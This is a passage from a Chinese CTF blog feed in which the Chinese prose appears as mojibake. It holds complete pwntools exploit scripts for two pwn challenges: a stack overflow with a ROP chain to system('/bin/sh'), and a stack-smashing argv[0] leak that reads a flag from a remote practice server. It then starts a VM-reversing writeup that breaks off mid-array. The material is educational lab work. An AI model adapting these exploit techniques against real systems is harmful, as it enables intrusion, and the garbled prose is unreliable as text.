ä¸ºå¯ä»¥çœ‹åˆ°rspçš„é‚£ä¸ªåœ°æ–¹å·²ç»å¡«å……å¥½äº†8ä¸ªeæ¥ä¸‹æ¥å°±è¦å‘0xffé‚£è¾¹å¡«å……äº†ï¼Œ0xffæ˜¯å¾ªç¯æ¡ä»¶çš„ä¸€ä¸ªå€¼ï¼ŒçŒœæµ‹æ˜¯å› ä¸ºè¿™ä¸ªå€¼è¢«è¦†ç›–äº†å¯¼è‡´å¾ªç¯æå‰ç»“æŸäº†ï¼Œé‚£ä¹ˆåœ¨é•¿åº¦åˆ°0xc8çš„æ—¶å€™ï¼Œè¿™ä¸ªä½ç½®åº”è¯¥å¡«ä¸Šä¸€ä¸ªp64(0xff)æ‰èƒ½è¿‡å»ï¼Œç„¶ååé¢åˆæœ‰ä¸€ä¸ªåœ°å€ï¼Œä¸éš¾å‘ç°å®ƒæ˜¯æˆ‘ä»¬buf_addrçš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°å€ä¹Ÿä¸åº”è¯¥è¢«è¦†ç›–ï¼Œè€Œåº”è¯¥å†™å›å»ã€‚åŒç†ï¼Œä¸‹é¢çš„iä½œä¸ºå¾ªç¯å˜é‡ä¹Ÿä¸åº”è¯¥è¢«è¦†ç›–ï¼Œè¿™ä¸ªåº”å½“èƒ½æå‰é¢„æµ‹åˆ°çš„ã€‚</p><p>è‡³äºè¿™ä¸ªä½ç½®åº”è¯¥å†™å¤šå°‘å‘¢ï¼Œå¯ä»¥æƒ³æƒ³å¦‚æœi=0çš„æ—¶å€™å†™è‡ªå·±åº”è¯¥å†™å¤šå°‘å‘¢ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è¿˜æ˜¯å†™ä¸ª0æ‰èƒ½ä¿è¯å†™è¿›å»å¹¶ä¸”i+1ã€‚é‚£ä¹ˆè¿™ä¸ªä½ç½®åœ¨å“ªå‘¢ï¼Œåº”è¯¥ä¸éš¾æ¨æµ‹å‡ºå¼€å§‹è¦†ç›–ret_addrçš„æ—¶å€™ï¼Œå®ƒçš„å€¼åº”å½“i=0xf8ï¼Œè¦†ç›–ä¹‹å‰çš„rbpæ—¶ï¼Œi=0xf0ï¼Œé‚£ä¹ˆå†å¾€å‰æ¨ï¼Œè¿™ä¸ªå€¼åº”è¯¥æ˜¯i=0xe8ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°æ–¹ç»™ä¸Š\xe8ç„¶ååé¢ä¸€å¾‹å¡«0å³å¯ã€‚å¯ä»¥çœ‹åˆ°è¿™æ¬¡æ ˆæº¢å‡ºæ³¨æ„çš„ä¸œè¥¿ä¹Ÿæ˜¯éå¸¸å¤šçš„ï¼Œå¯ä»¥è¯´è¿™é¢˜ç›®å‡ºçš„ä¹Ÿæ˜¯ç›¸å½“å¥½çš„ã€‚</p><p>æœ€åå°±æ²¡ä»€ä¹ˆè®²ç©¶äº†ï¼Œè¦†ç›–ä¸Šret_addrä¸ºpop_rdi_retçš„gadgetå°±èƒ½ç›´æ¥getshellã€‚ä¸‹é¢æ˜¯å®Œæ•´payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/10.png" alt="10"></p><p>èƒ½ç¨³å®šgetsehllï¼Œä½†æ˜¯å‰ææ˜¯aslrå…³äº†ï¼Œaslrå…³äº†è°ƒè¯•å…¶å®æ˜¯éå¸¸èˆ’æœçš„ï¼Œå› ä¸ºé¢å¯¹å¤æ‚çš„æƒ…å†µæœ‰æ—¶å€™å¯èƒ½ä¸èƒ½getshellï¼Œå°±æ¯”å¦‚å‰é¢ä¸¾è¿‡çš„ä¾‹å­ï¼Œç¨‹åºåŸºå€çš„æœ€é«˜å­—èŠ‚é\x55ï¼Œbuf_addrçš„æœ€ä½å­—èŠ‚è¿‡å¤§ï¼Œç›®å‰å·²çŸ¥å°±è¿™ä¸¤ç§æƒ…å†µä¼šå¯¼è‡´æ— æ³•æ­£å¸¸getshellã€‚</p><p>è¿™é‡Œè¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œå› ä¸ºå…³äº†aslrï¼Œæˆ‘ä»¬å‰é¢çš„æ¥å—æ³„éœ²çš„åœ°å€æ˜¯ç”¨çš„p.recvuntil(bâ€™\x55â€™*4)[-6:]ï¼Œå…³äº†ä¹‹åè¦æŠŠåé¢é‚£ä¸ª4å»æ‰ï¼Œè¿™é‡Œå› ä¸ºè¯†åˆ«å•ä¸ªå­—èŠ‚ï¼Œä¸æ’é™¤ä¼šè¯†åˆ«é”™è¯¯ï¼Œè¿™ä¸ªéšæœºåŠ è½½è°è¯´çš„æ¸…æ¥šå‘¢ï¼Œè¿™éƒ½æ˜¯å°é—®é¢˜ã€‚ä¸‹é¢ç»™å‡ºæˆ‘å¼€äº†aslrçš„è¿è¡Œç»“æœã€‚</p><p><img src="/2021/11/06/zjctf2021%20pwn2/11.png" alt="11"></p><p>å¦‚æœå¸Œæœ›èƒ½ä¸€æŠŠæ¢­ï¼Œé‚£ä¹ˆå¯ä»¥æŠŠæ”»å‡»çš„éƒ¨åˆ†ä½œä¸ºä¸€ä¸ªå‡½æ•°ï¼Œç„¶åä¸»å‡½æ•°while 1 try exceptè¿™æ ·ç©ï¼Œä½†æ˜¯è¦æ³¨æ„ç»™å¼€å¤´å››ä¸ªrecvuntiléƒ½åŠ ä¸Šä¸€ä¸ªå‚æ•°timeout=0.5ï¼Œè¿™æ ·å®ƒæ¥æ”¶ä¸åˆ°è¿™ä¸ªå­—èŠ‚è¶…è¿‡0.5ç§’å°±ä¼šåœæ­¢æ¥æ”¶ï¼Œåé¢å°±ä¼šäº§ç”ŸæŠ¥é”™ï¼ŒæŠ¥é”™ä¹‹åè‡ªå·±ä¼šé‡æ–°è¿è¡Œä¸€éã€‚æ³¨æ„ä¸‹é¢ç»™çš„expå¹¶æ²¡æœ‰åŠ ä¸Šè¿™ä¸ªï¼Œä½†æ˜¯åŠ çš„æ–¹æ³•å·²ç»å‘Šè¯‰ä½ äº†ã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;sentence&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b myread&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr</span><br><span class="line"></span><br><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line"><span class="comment">#success(&#x27;a&#x27;*offset)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wdb2018_guess writeup</title>
      <link href="/2021/11/04/wdb2018_guess%20writeup/"/>
      <url>/2021/11/04/wdb2018_guess%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buuåˆ·é¢˜è®°å½•ï¼š<a href="https://buuoj.cn/challenges#wdb2018_guess">wdb2018_guess</a></p><span id="more"></span><h2 id="é™æ€åˆ†æelfæ–‡ä»¶"><a href="#é™æ€åˆ†æelfæ–‡ä»¶" class="headerlink" title="é™æ€åˆ†æelfæ–‡ä»¶"></a>é™æ€åˆ†æelfæ–‡ä»¶</h2><p>checksecä¸€ä¸‹å‘ç°å¼€äº†NXå’Œcanaryä¿æŠ¤ï¼Œ64ä½ç¨‹åºï¼Œç”¨idaåˆ†æçœ‹çœ‹</p><p>å¾ˆæ˜æ˜¾çš„getsæ ˆæº¢å‡ºï¼Œå¹¶ä¸”getsä¹‹åæ²¡æœ‰å›æ˜¾è¾“å…¥çš„å†…å®¹ï¼Œé‚£è¿™æ ·çš„è¯æ„å‘³ç€ä¸èƒ½æ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµäº†ã€‚é‚£ä¹ˆçœ‹çœ‹å‰é¢ï¼Œå‘ç°æœ‰ä¸€ä¸ªæŠŠflagæ–‡ä»¶å†…å®¹è¯»åˆ°æ ˆä¸Šé¢çš„åŠ¨ä½œã€‚åé¢whileå¾ªç¯è°ƒç”¨äº†ä¸€ä¸ªsub_400A11å‡½æ•°ï¼Œv7=3ï¼Œv6=0,ï¼Œv7&gt;=v6 breakå°±æ„å‘³ç€è¿™ä¸ªå‡½æ•°ä¼šè¢«è°ƒç”¨ä¸‰æ¬¡ã€‚è€Œå‘ç°sub_400A11å‡½æ•°æ˜¯è°ƒç”¨forkå‡½æ•°ï¼Œforkå‡½æ•°ä¼šåˆ›å»ºå’Œå½“å‰è¿›ç¨‹ä¸€æ¨¡ä¸€æ ·çš„è¿›ç¨‹ï¼Œç„¶åèŒƒå›´è‡ªèº«è¿›ç¨‹çš„IDï¼Œå¦‚æœæ˜¯è¢«åˆ›å»ºçš„è¿›ç¨‹ï¼Œé‚£ä¹ˆforkå°†ä¼šè¿”å›0ã€‚</p><p>ç®€å•ç‚¹å°±æ˜¯forkçš„å­è¿›ç¨‹ä¼šè¿”å›0ï¼Œå¦‚æœè¿”å›0é‚£ä¹ˆbreakæ‰§è¡Œä¸‹é¢çš„å†…å®¹ï¼Œçˆ¶è¿›ç¨‹å› ä¸ºè¿”å›è‡ªå·±è¿›ç¨‹å·ä¸ä¼šbreakåˆ™ç»§ç»­å¾ªç¯ï¼Œç„¶åè°ƒç”¨forkï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè¿›ç¨‹ä¸€å…±ä¼šäº§ç”Ÿ3ä¸ªå­è¿›ç¨‹æ‰§è¡Œwhileå¾ªç¯ä¹‹åçš„å†…å®¹ã€‚</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œé‚£å°±æ˜¯åœ¨å‘ç”Ÿæ ˆæº¢å‡ºä¹‹åstack_chk_failã€‚åœ¨ç»ˆæ­¢ç¨‹åºä¹‹å‰è¿˜ä¼šæ‰“å°argv[0]ï¼Œè¿™ä¸€ç‚¹å¾ˆåˆç†ã€‚ä½†æ˜¯è¿™é‡Œå¯ä»¥ç”¨äºæ³„éœ²æ ˆä¸Šçš„flagï¼Œæˆ‘ä»¬å¦‚æœgetsè¦†ç›–åˆ°argv[0]ï¼Œå°±å¯ä»¥ä»»æ„åœ°å€æ³„éœ²äº†ï¼Œä½†æ˜¯å› ä¸ºåªæœ‰ä¸‰ä¸ªå­è¿›ç¨‹ï¼Œå°±åªèƒ½æ³„éœ²ä¸‰æ¬¡ï¼Œå‰ä¸¤æ¬¡ä¸€å®šè¦æŠŠæ ˆåœ°å€æ³„éœ²å‡ºæ¥ã€‚ä½†æ˜¯å‘¢ç°åœ¨æ ˆåœ°å€æ˜¯ä¸çŸ¥é“çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ä¸€æ¬¡æ³„éœ²æ³„éœ²å‡ºlibcçš„åœ°å€ï¼ŒäºŒæ¬¡æ³„éœ²å‡ºæ ˆåœ°å€ï¼Œæœ€åä¸€æ¬¡æ³„éœ²flagã€‚å…¶å®è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹ä¸å¤ªç†è§£ï¼Œå°±æ˜¯forkä¹‹åæ ˆæ˜¯å…±äº«çš„å˜›ï¼Ÿlibcæ˜¯å…±äº«çš„å¾ˆå¥½ç†è§£ï¼Œæ ˆå…±äº«å°±ä¸æ˜¯å¾ˆå¥½ç†è§£äº†ï¼Œè¿˜æ˜¯è¯´å®ƒæ ˆä¸åŒï¼Œåªæ˜¯å¯¹åº”åç§»çš„åœ°æ–¹éƒ½æœ‰flagï¼Œç„¶åæˆ‘æ³„éœ²çš„æ˜¯åˆ«çš„è¿›ç¨‹ä¸Šé¢çš„flagï¼Œå€¾å‘äºè¿™ç§è§£é‡Šã€‚</p><h2 id="åŠ¨æ€è°ƒè¯•ç¡®å®šåç§»"><a href="#åŠ¨æ€è°ƒè¯•ç¡®å®šåç§»" class="headerlink" title="åŠ¨æ€è°ƒè¯•ç¡®å®šåç§»"></a>åŠ¨æ€è°ƒè¯•ç¡®å®šåç§»</h2><p>ç°åœ¨å°±éœ€è¦çŸ¥é“è¿™ä¸ªbufåˆ°åº•éœ€è¦å¤šå°‘å­—èŠ‚èƒ½è¦†ç›–argv[0]ï¼Œæ‰€ä»¥éœ€è¦åŠ¨è°ƒä¸€æ³¢ã€‚æ–­ç‚¹ä¸‹åœ¨forkå¾ªç¯ä¹‹åï¼Œè¿™é‡Œæˆ‘é€‰æ‹©äº†0x400b0dçš„ä½ç½®ï¼Œrã€‚ä¸ºäº†ç¡®å®šbufçš„ä½ç½®ï¼Œæˆ‘ä»¬é€‰æ‹©getsè¯»å…¥å¾ˆå¤šä¸ªaçœ‹çœ‹å®ƒä¸argv[0]ä¹‹é—´çš„åç§»ã€‚</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/1.png" alt="1"></p><p>å¾ˆå®¹æ˜“å¯ä»¥ä»å·¦è¾¹çœ‹å‡ºæ¥ï¼Œä»–ä»¬ä¹‹é—´å·®äº†0x128ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆpayloadå°±æ˜¯0x128*bâ€™aâ€™+p64(è¦æ³„éœ²å†…å®¹çš„åœ°å€)ã€‚</p><p>ç¬¬ä¸€æ¬¡æ‹¿ä¸‹libcä¹‹åç¬¬äºŒæ¬¡åº”è¯¥è¦æ‹¿__environï¼Œè¿™ä¸ªæˆ‘ä¹Ÿæ˜¯çœ‹writeupçŸ¥é“çš„ï¼Œè¿™ä¸ªå¥½åƒå°±æ˜¯æŒ‡å‘argv[0]çš„åœ°å€ã€‚ä¹Ÿå°±æ˜¯æ ˆä¸Šçš„åœ°å€ï¼Œè¿™ä¸ªæ˜¯åœ¨libcé‡Œé¢çš„ï¼Œæ‰€ä»¥æ‹¿åˆ°libcä¹‹åå°±å¯ä»¥æ³„éœ²è¿™ä¸ªï¼Œç„¶åå†è§‚å¯Ÿæ³„éœ²çš„åœ°å€å’Œflagçš„åœ°å€å·®å¤šå°‘ï¼Œç¡®å®šå¥½åç§»ä¹‹åç¬¬ä¸‰æ¬¡å°±å¯ä»¥ç›´æ¥æ³„éœ²flagäº†ï¼Œè¿™é‡Œæµ‹è¯•ä¹‹åæ˜¯0x168çš„åç§»ï¼Œæ³„éœ²çš„åœ°å€å†å‡å»0x168å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„flagäº†ã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.23&#x27;</span></span><br><span class="line">libc_in_local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(context.arch)==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        <span class="keyword">if</span> libc_in_local:libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./GUESS&#x27;</span>,<span class="number">29108</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">libc_addr = leak_addr(payload1)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_Addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])</span><br><span class="line">stack_addr = leak_addr(payload2)-<span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(stack_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æˆåŠŸgetflag</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯2020é’é¾™ç»„singal writeup</title>
      <link href="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/"/>
      <url>/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/</url>
      
        <content type="html"><![CDATA[<p>ä¸çŸ¥ä¸è§‰åšåˆ°äº†è™šæ‹Ÿæœºé€†å‘äº†ï¼Œæ›¾ç»æˆ‘ä¹Ÿåªæ˜¯å¬è¯´ï¼Œè¿˜æœªæ›¾æƒ³ä¹Ÿèƒ½è‡ªå·±åšå‡ºã€‚</p><span id="more"></span><h2 id="é™æ€åˆ†ææ–‡ä»¶"><a href="#é™æ€åˆ†ææ–‡ä»¶" class="headerlink" title="é™æ€åˆ†ææ–‡ä»¶"></a>é™æ€åˆ†ææ–‡ä»¶</h2><p>exeæ–‡ä»¶ï¼Œå…ˆæŸ¥å£³ï¼Œæ²¡æœ‰å£³ç›´æ¥idaæ‰“å¼€ã€‚</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/1.png" alt="1"></p><p>mainå‡½æ•°é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå…ˆæ‹·è´ä¸€ä¸²å†…å­˜ç»™v4ï¼Œv4å†ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ç»™vm_operadå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯114ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å…ˆæå–å®ƒæ‹·è´çš„å†…å­˜ï¼Œè‡³äºè¿™æ®µå†…å­˜å¦‚ä½•ä½¿ç”¨é‚£å°±è¿›å»åˆ†ævm_operadå‡½æ•°äº†ã€‚å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªç¬¬ä¸€ä¸ªå‚æ•°æ˜¯int*ç±»å‹çš„ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å¯¹a1åšå¼ºåˆ¶è½¬æ¢ä¹‹ç±»çš„å…³ç³»ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾è¿™ä¸ªå†…å­˜æ˜¯ä¸€ä¸ªintæ•°ç»„ï¼Œé‚£ä¹ˆç”¨æå–æˆcharæ•°ç»„ä¹‹åå†ç”¨int *ç±»å‹å»è¾“å‡ºå®ƒå°±èƒ½å¾—åˆ°å¯¹åº”çš„intæ•°ç»„ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span 